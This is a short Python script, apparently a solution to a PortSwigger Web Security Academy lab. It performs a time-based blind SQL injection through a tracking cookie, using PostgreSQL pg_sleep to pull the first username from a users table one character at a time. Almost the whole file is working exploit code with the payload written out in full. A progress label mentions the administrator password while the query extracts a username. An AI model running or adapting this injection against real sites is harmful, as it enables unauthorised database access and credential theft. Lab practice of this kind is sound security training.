#!/usr/bin/python3

import requests
import signal
import sys
import time 
import string
import http.client
import ssl
import urllib3
from pwn import *



def def_handler(sig,frame):
    print ("\n\n....SALIENDO....\n\n")
    sys.exit(1);

#CONTROL+C

signal.signal(signal.SIGINT, def_handler)


main_url = "https://0a9600c8030278c88ae9242400d800af.web-security-academy.net"
p1= log.progress("Forece Brute")
p1.status("Starting Force Brute")


time.sleep(2)

p2 = log.progress("password-administrator")

characters = string.printable

def makeSQLI():
    
    user = ""

    for position in range(1,50): 
        for character in characters:
             
            headers = {
'Host': '0a9600c8030278c88ae9242400d800af.web-security-academy.net',
'Cookie': "TrackingId=1L4nKqeXLkaGPxIA'||(select case when (select ( select substring(username,%d,1))='%s') then pg_sleep(10) else pg_sleep(0) end from users limit 1)--     ; session=iwPgcApzOOzeJw4nZGs3wPx7TCP7R4qO" % (position,character),
'Cache-Control': 'max-age=0',
'Sec-Ch-Ua': '"Chromium";v="117", "Not;A=Brand";v="8"',
'Sec-Ch-Ua-Mobile': '?0',
'Sec-Ch-Ua-Platform': '"Linux"',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Sec-Fetch-Site': 'cross-site',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-User': '?1',
'Sec-Fetch-Dest': 'document',
'Referer': 'https://portswigger.net/',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9'
}  


            p1.status(headers['Cookie'])
            
            time_start = time.time()
            r = requests.get(main_url,headers=headers)
            r.close()
            time_end = time.time()
            
            timefull = time_end - time_start

       

            if timefull > 10:
                user += character
                p2.status(user)
                break

            r.close()
            
   
if __name__ == '__main__':

    makeSQLI()
